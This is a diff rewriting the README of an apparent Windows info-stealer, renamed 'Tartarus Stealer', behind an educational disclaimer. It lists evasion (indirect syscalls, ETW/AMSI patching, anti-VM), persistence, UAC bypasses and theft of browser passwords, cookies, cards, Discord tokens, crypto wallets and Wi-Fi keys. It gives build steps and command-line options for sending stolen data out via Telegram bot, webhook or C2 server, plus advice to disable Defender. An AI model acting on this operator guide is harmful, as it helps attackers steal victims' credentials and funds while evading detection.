@@ -1,147 +1,278 @@
-Stealer.cpp – Educational Credential Extraction Tool
+🐂 TARTARUS STEALER
 
-⚠️ WARNING: This project is provided for educational and defensive research purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author is not responsible for any misuse.
+Educational Malware Analysis & Offensive Security Research
 
----
-
-Overview
-
-stealer.cpp is a fully-featured Windows credential and data extraction tool, designed to demonstrate a wide range of offensive security techniques commonly used in modern malware. It implements:
-
-· Indirect syscalls (Hell’s Gate + custom stubs) to bypass user-mode hooks.
-· ETW/AMSI patching to evade detection.
-· Anti‑debugging & anti‑VM measures.
-· UAC bypass and privilege escalation.
-· Persistence via Run key and scheduled tasks.
-· Extraction of passwords, cookies, credit cards, history, bookmarks, autofill, and Discord tokens from Chromium‑based browsers (Chrome, Edge, Brave, Opera, Vivaldi, etc.) and Firefox.
-· Recovery of crypto wallets, VPN configurations, Wi‑Fi passwords, FileZilla sites, Outlook profiles, Steam credentials, and Telegram sessions.
-· Memory scanning for passwords and tokens in running processes.
-· Exfiltration via Telegram bot or custom webhook.
-
-The code is intentionally kept as a single self‑contained file to simplify study.
+https://img.shields.io/badge/License-MIT-blue
+https://img.shields.io/badge/Platform-Windows-lightgrey
+https://img.shields.io/badge/C++-17-blue?logo=c%2B%2B
+https://img.shields.io/badge/Build-MSVC-green
 
 ---
 
-Features
+⚠️ LEGAL DISCLAIMER
 
-Category Features
-Evasion Indirect syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.), ETW/AMSI patching, unhooking of ntdll, anti‑debug (debugger detection, timing checks, hardware breakpoints), VM detection (hypervisor, low RAM, few CPUs, small disk).
-Persistence Adds itself to HKCU\Software\Microsoft\Windows\CurrentVersion\Run and creates a scheduled task running as SYSTEM.
-Privilege Escalation UAC bypass using the ms-settings registry trick + token duplication to launch a SYSTEM shell.
-Browser Data Decrypts AES‑GCM (v10/v11) and DPAPI‑encrypted data from Chromium‑based browsers using the master key from Local State. Supports App‑Bound encryption (APPB) via COM elevation. Extracts logins, cookies, credit cards, history, bookmarks, autofill, and Discord tokens.
-Firefox Reads logins.json and cookies.sqlite (decryption not fully implemented, but marks files for later processing).
-System Data Wi‑Fi passwords (via WLAN API), VPN configs (NordVPN, ExpressVPN, ProtonVPN), FileZilla sitemanager.xml, Outlook registry keys, Steam loginusers.vdf, Telegram Desktop session files, crypto wallets (Exodus, Electrum, Atomic, Guarda, Coinomi, Binance, MetaMask, Trust, Phantom).
-Memory Scraping Scans memory of chrome.exe, msedge.exe, brave.exe, opera.exe for JSON‑like "password":"..." and Discord‑style tokens.
-Exfiltration Uploads the collected JSON file to a Telegram bot (via sendDocument) or a custom HTTPS webhook using multipart/form‑data.
-Output Writes data to C:\ProgramData\SystemCache\stealer_output.json and a pretty‑printed full_data.json.
+This project is strictly for educational and research purposes only.
+It is designed to help cybersecurity professionals, students, and researchers understand modern malware techniques, offensive security tactics, and defensive countermeasures.
+
+Do not use this software on any system without explicit written permission from the owner.
+The author and contributors are not responsible for any misuse or damage caused by this tool. Use it only in isolated, controlled environments (e.g., your own lab virtual machines).
 
 ---
+
+🔥 Overview
+
+Tartarus Stealer is a proof-of-concept (PoC) stealer that demonstrates a wide range of post‑exploitation capabilities commonly found in advanced persistent threats (APTs) and modern info‑stealers. It is named after the Tartarus – the deep abyss in Greek mythology – and features a bull as its mascot, symbolizing strength and relentless data collection.
+
+This project is a learning resource to dissect:
+
+· ✅ Syscall obfuscation & indirect syscalls (bypassing EDR/AV hooks)
+· ✅ Anti‑debugging & anti‑VM techniques
+· ✅ Persistence mechanisms (Registry, Scheduled Tasks, Services, WMI, COM hijacking)
+· ✅ UAC bypasses (Fodhelper, Eventvwr, CMSTP)
+· ✅ Credential & browser data extraction (Chrome, Edge, Firefox, Opera, etc.)
+· ✅ Discord token theft (from LevelDB and browser cookies)
+· ✅ Cryptocurrency wallet harvesting
+· ✅ Wi‑Fi password recovery
+· ✅ Process injection (Early Bird, Process Hollowing, Module Stomping)
+· ✅ C2 communication (Telegram, Webhook, raw TCP)
+· ✅ Encryption & compression of exfiltrated data
+
+---
+
+🐃 The Bull Spirit
+
+"The bull charges forward, unstoppable, just like data flows in the digital world."
+
+<p align="center">
+  <img src="https://i.imgur.com/YV7lH1U.png" alt="Bull" width="400"/>
+</p>
+
+ASCII bull:
+
+```
+      (__)  
+      (oo)  
+  /------\/  
+ / |    ||  
+*  /\---/\  
+   ~~   ~~  
+```
+
+---
+
+🚀 Features
+
+🔐 Evasion & Anti‑Analysis
+
+· Indirect Syscalls – dynamically resolves Nt* syscall numbers and calls them via a custom gadget, avoiding user‑land hooks.
+· NTDLL Unhooking – reloads a clean copy of ntdll.dll from disk to remove EDR/AV patches.
+· ETW & AMSI Patching – disables Event Tracing for Windows and Anti‑Malware Scan Interface.
+· Anti‑Debug / Anti‑VM / Anti‑Sandbox – checks for debuggers, virtual machines, and sandbox environments (CPUID, memory, disk space, processes, windows, etc.).
+· Thread hiding – hides the main thread from debuggers.
+· Ekko‑style Sleep – encrypts the payload before sleeping and decrypts after, to defeat memory scanners.
+
+💾 Persistence & Elevation
+
+· Multiple persistence points:
+  · Registry Run keys (HKCU, HKLM)
+  · Scheduled Tasks (via schtasks)
+  · Windows Service
+  · WMI Event Subscription
+  · Startup Folder
+  · COM Hijacking (CLSID)
+· UAC bypass techniques:
+  · Fodhelper (via ms‑settings)
+  · Eventvwr (via mscfile)
+  · CMSTP (via INF file)
+· Elevation to SYSTEM by duplicating a token from winlogon.exe.
+
+🧾 Data Exfiltration
+
+🔍 Browsers (Chromium‑based & Firefox)
+
+· Passwords, cookies, credit cards, history, bookmarks, autofill.
+· Decrypts Chrome‑style encrypted values (AES‑GCM) using the OS‑protected master key.
+
+💬 Messaging & Gaming
+
+· Discord tokens (from cookies and LevelDB files).
+· Telegram session files (from tdata).
+
+💰 Cryptocurrency Wallets
+
+· Exodus, Electrum, Atomic, Guarda, Coinomi, Binance, MetaMask (LevelDB), Trust, Phantom, and many more.
+
+🌐 Network & Credentials
+
+· Wi‑Fi SSID/passwords (via WLAN API).
+· VPN configurations (NordVPN, ExpressVPN, ProtonVPN, OpenVPN).
+· Windows Credential Manager vault.
+· FileZilla & WinSCP saved credentials.
+· Outlook profiles.
+
+🎮 Gaming Platforms
+
+· Steam (loginusers.vdf), Uplay (settings.ini), Epic Games (GameUserSettings.ini).
+
+🧠 Memory Scraping
+
+· Scans memory of browser processes for passwords and tokens using regex patterns.
+
+📡 C2 & Reporting
+
+· Output formats: JSON (structured, easy to parse).
+· Exfiltration channels:
+  · Telegram Bot (via sendDocument)
+  · Generic Webhook (multipart/form‑data)
+  · Raw TCP socket to a C2 server
+· Compression: uses AES‑GCM encryption (with a random key per run) to protect exfiltrated data.
+· Thread‑pool for concurrent data extraction.
+
+---
+
+📦 Build & Dependencies
+
+Prerequisites
+
+· Windows SDK (10.0.19041.0 or later)
+· Visual Studio 2019 / 2022 (with C++ development tools)
+· vcpkg or manually installed libraries:
+  · SQLite3
+  · OpenSSL (1.1.1 or later)
+  · nlohmann/json (header‑only)
+
+All required libraries are linked via #pragma comment(lib, ...) in the source, but you must ensure the .lib files are available.
 
 Compilation
 
-The project is written for Visual Studio (x64) and depends on several libraries:
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/yourusername/TartarusStealer.git
+   cd TartarusStealer
+   ```
+2. Open the solution in Visual Studio.
+3. Set the configuration to Release and x64.
+4. Build the project (F7).
 
-· OpenSSL (libcrypto, libssl)
-· SQLite3
-· nlohmann/json
-· zlib (optional, for compression, but not heavily used)
-· Windows SDK (user32, shell32, advapi32, crypt32, winhttp, wlanapi, iphlpapi, ntdll, ole32, oleaut32, wbemuuid, dbghelp, psapi)
+The resulting executable will be located in x64\Release\stealerv2.exe.
 
-Compiler Command Line
+---
 
-```bash
-cl /EHsc /std:c++17 /O2 /MD /D_UNICODE /DUNICODE ^
-   /I"C:\path\to\openssl\include" /I"C:\path\to\sqlite3" /I"C:\path\to\nlohmann" ^
-   stealer.cpp /link /LIBPATH:"C:\path\to\openssl\lib" ^
-   libcrypto.lib libssl.lib sqlite3.lib zlib.lib ^
-   user32.lib shell32.lib advapi32.lib crypt32.lib ^
-   winhttp.lib wlanapi.lib iphlpapi.lib ntdll.lib ^
-   ole32.lib oleaut32.lib wbemuuid.lib dbghelp.lib psapi.lib
+🛠️ Usage
+
+Run with administrative privileges for maximum data collection.
+
+```cmd
+stealerv2.exe [options]
 ```
 
-Note: Replace the include and library paths with the actual locations of the dependencies. The project is 64‑bit only.
+Command‑line Options
 
----
+Option Description
+--telegram-token <token> Telegram bot token
+--telegram-chat <chat_id> Telegram chat ID
+--webhook <url> Webhook URL (e.g., https://your-server.com/upload)
+--c2-host <host> C2 server hostname/IP
+--c2-port <port> C2 server port
+--no-exfil Disable data exfiltration (only save locally)
+--no-compress Disable encryption/compression of output
+--no-silent Show console window (default is silent)
+--no-antidebug Disable anti‑debugging checks
+--no-persistence Disable persistence installation
+--threads <n> Number of threads for extraction (default = CPU cores)
+--output-dir <path> Output directory (default: C:\ProgramData\SystemCache)
+--browser <name> Only process specific browser(s), e.g., --browser Chrome --browser Firefox
 
-Usage
+Example
 
-The executable accepts several command‑line arguments:
-
-Argument Description
---telegram-token <token> Bot token for Telegram exfiltration.
---telegram-chat <chat_id> Chat ID for Telegram exfiltration.
---webhook <url> Custom webhook URL (HTTPS).
---no-exfil Skip exfiltration.
---no-compress Disable compression (unused stub).
---no-silent Show console output (default is silent).
---no-antidebug Disable anti‑debug/VM loop.
---no-persistence Disable persistence installation.
---threads <n> Number of threads for browser processing (default = hardware concurrency).
---output-dir <path> Output directory (default: C:\ProgramData\SystemCache).
---browsers-filter <name1,name2,...> Comma‑separated list of browsers to process (e.g., Chrome,Edge).
---app-key-decrypt <encrypted_key> Internal use for App‑Bound decryption via COM elevation.
---browser-app-path <path> Path to browser executable (used with above).
-
-Example:
-
-```bash
-stealer.exe --telegram-token "123:abc" --telegram-chat "456" --threads 4
+```cmd
+stealerv2.exe --telegram-token "123456:ABC-DEF" --telegram-chat "123456789" --threads 4
 ```
 
-If no arguments are given, it runs with default settings (anti‑debug, persistence, all browsers, all data types, and exfiltration only if Telegram or webhook credentials are provided).
+---
+
+📊 Output Structure
+
+The tool writes two files in the output directory:
+
+· stealer_output.json – a JSON Lines‑like array containing each stolen item (passwords, cookies, etc.) with a type field.
+· full_data.json – a complete JSON object with the same data, optionally encrypted (AES‑GCM + Base64) if compression is enabled.
+
+Sample entry:
+
+```json
+{
+  "type": "password",
+  "browser": "Chrome",
+  "profile": "Default",
+  "url": "https://example.com/login",
+  "username": "user@example.com",
+  "password": "SuperSecret123"
+}
+```
 
 ---
 
-How It Works (High‑Level)
+🧪 Lab Environment
 
-1. Initialisation – Loads ntdll.dll, resolves syscall numbers via Hell’s Gate, unhooks ntdll, finds a syscall; ret gadget, patches ETW and AMSI.
-2. Anti‑Debug – Spawns a background thread that continuously checks for debuggers, VMs, and triggers a busy‑loop if detected.
-3. Persistence & UAC – Installs itself in Run and creates a scheduled task; attempts UAC bypass and token duplication to gain SYSTEM privileges.
-4. Data Collection – Enumerates browser user data directories, extracts the master key (DPAPI or App‑Bound), and then uses a thread pool to parse SQLite databases and JSON files.
-5. Additional Modules – Collects Wi‑Fi, VPN, crypto wallets, memory scrapes, etc.
-6. Output – All entries are written to a JSON array in stealer_output.json and a structured full_data.json.
-7. Exfiltration – If configured, the output file is uploaded via Telegram or webhook.
+For safe testing, use a Windows 10/11 virtual machine disconnected from any production network.
 
----
+Recommended Setup
 
-Educational Purpose
-
-This project is a case study for understanding:
-
-· Windows internals (syscalls, PE parsing, DLL unhooking).
-· Anti‑analysis techniques (debugger detection, timing, VM checks).
-· Cryptography (DPAPI, AES‑GCM, COM‑based App‑Bound decryption).
-· SQLite database parsing and browser storage formats.
-· Process memory scanning and pattern matching.
-· Common persistence and privilege escalation vectors.
-· Secure exfiltration over HTTPS.
-
-By studying the code, security researchers and students can learn about the inner workings of modern info‑stealing malware, which helps in building better detection and defensive strategies.
+· Disable Windows Defender or add exclusions to avoid interference.
+· Run as Administrator.
+· Monitor with Process Monitor, API Monitor, or a debugger to understand the techniques.
 
 ---
 
-Disclaimer
+📸 Screenshots
 
-This software is intended for academic and defensive purposes only.
-Do not run it on any system without explicit written permission from the owner. The authors and contributors are not liable for any damage or legal consequences arising from misuse. Use at your own risk.
+(Placeholder – replace with actual screenshots of the tool in action)
 
----
+<p align="center">
+  <img src="https://via.placeholder.com/800x400?text=Stealer+Output+Example" alt="Screenshot 1"/>
+</p>
 
-License
-
-This project is provided under the MIT License – see the LICENSE file for details.
-
----
-
-Acknowledgements
-
-· Hell’s Gate – for the syscall resolution technique.
-· nlohmann/json – JSON library.
-· OpenSSL and SQLite projects for their libraries.
+<p align="center">
+  <img src="https://via.placeholder.com/800x400?text=Console+Execution" alt="Screenshot 2"/>
+</p>
 
 ---
 
-Contact
+🤝 Contributing
 
-For questions or suggestions regarding this educational tool, please open an issue on the GitHub repository.
-Do not ask for help in using this for malicious purposes.
+Contributions are welcome! This project is intended for educational advancement. Please open an issue or a pull request if you have improvements, bug fixes, or new techniques to add.
+
+Guidelines:
+
+· Keep the code portable and well‑commented.
+· Add educational explanations when introducing new anti‑analysis tricks.
+· Ensure all added features respect the non‑malicious intent.
+
+---
+
+📜 License
+
+This project is licensed under the MIT License – see the LICENSE file for details.
+
+---
+
+📬 Contact
+
+For questions, suggestions, or collaboration:
+
+· GitHub Issues: https://github.com/yourusername/TartarusStealer/issues
+· Email: research@example.com
+
+---
+
+“Knowledge is the only weapon that can protect us from the monsters we create.”
+– Anonymous
+
+---
+
+<p align="center">
+  <img src="https://i.imgur.com/YV7lH1U.png" alt="Bull" width="200"/>
+  <br/>
+  <b>🐂 TARTARUS STEALER – Unleash the Bull, but responsibly.</b>
+</p>
